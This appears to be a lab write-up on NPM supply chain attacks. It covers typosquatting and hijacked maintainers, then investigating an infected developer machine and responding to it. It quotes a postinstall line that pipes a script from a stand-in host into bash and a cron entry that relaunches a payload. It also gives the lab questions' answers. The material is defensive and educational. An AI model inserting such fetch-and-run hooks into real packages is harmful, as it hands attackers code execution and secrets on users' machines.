Supply Chain Attack targets a third-party vendor instead of the main target.

## What is NPM?
**Node Package Manager** - Package manager for node.js and largest software registry in the world. Run `npm install [package-name]` and NPM downloads the code created by someone else directly into your project's node_modules folder.

## Anatomy of an Attack
NPM supply chain attack usually goes down in one of the three ways:
- Typosquatting: The attacker publishes a malicious package with a name slightly off from a popular one (e.g., electorn instead of electron).
- Account Takeover: The attacker phishes or cracks the password of a legitimate package maintainer. They push a "minor update" to the real package that includes malware.
- Protestware/Rogue Maintainer: The actual creator of the package intentionally pushes destructive code to make a political statement or out of frustration.

**Key Mechanism - `postinstall`:**
NPM allows scripts (like `postinstall`) to run automatically after installation (package.json). Attackers exploit this by adding commands such as:

```json
"postinstall": "curl http://evil-server.com/payload.sh | bash"
```
This executes malicious code immediately when `npm install` is run, often with the user’s permissions—making it highly dangerous.



### Step 1: Network Analysis

Malware often needs to **communicate with a Command & Control (C2) server**, so monitoring network activity can reveal infections.

* Use tools like **`netstat`** or **`ss`** to view active and outbound connections.
* A common monitoring command:

  ```bash
  netstat -antp | grep -E 'SYN_SENT|ESTABLISHED' | grep -v ssh
  ```
* Run with **root privileges (`sudo`)** to see full process details.

**What to look for:**

* Suspicious **outbound connections**
* Unknown or unfamiliar **IP addresses**
* Connections on **port 443 (HTTPS)**, often used to disguise malicious traffic

These can indicate a RAT beaconing to its C2 server.


### Step 2: Process Monitoring

After finding a suspicious connection, check the **PID/program** in `netstat`. Then inspect it with:

```bash id="s8fj2k"
ps aux | grep python3
```

or use `top` for real-time activity.

**Watch for:** unusual CPU spikes and note the **full path of the running script**—this helps identify the malicious process.


QS: What is the absolute path to the malicious payload running in memory?
Run: `top`
Look for:
A python3 process (or suspicious process)
Press: `c`
You'll see something like: /usr/bin/python3 /tmp/ld.py


### Step 3: Finding Persistence

Attackers often use **cron jobs** to restart malware after reboot.

Check the dev user’s cron:

```bash id="n8x2zp"
crontab -l -u dev
```

**Look for:** a suspicious entry running the same malicious script (often hidden, using `&` or `/dev/null`).

QS: How often (in minutes) does the system attempt to restart the malware?
Run: `sudo su`
Then run: `crontab -l -u dev`
You'll see something like: */5 * * * * /usr/bin/python3 /tmp/ld.py > /dev/null 2>&1


### Step 4: File System Analysis

Go to the infected package:

```bash
cd /home/dev/myapp/node_modules/plain-crypto-js
ls -la
```

Check files:

```bash
cat package.json
cat setup.js
```

**What happens:**

* `package.json` → triggers **`postinstall`**
* `setup.js` → creates **cron persistence** + runs `/tmp/ld.py`

### Incident Response

If a dev machine runs a malicious `postinstall` → **assume full compromise (secrets stolen)**.

**1. Isolate Host**

* Cut network (Wi-Fi/Ethernet) immediately
* Don’t power off (preserve memory)

**2. Rotate All Secrets**

* Revoke & regenerate: **AWS/GCP/Azure keys, GitHub/GitLab tokens, NPM/PyPI tokens, VPN/passwords**

**3. Check for Abuse**

* Review logs (e.g., **CloudTrail, GitHub audit logs**) for suspicious activity

**4. Rebuild System**

* Do NOT clean → **wipe disk + fresh OS install**
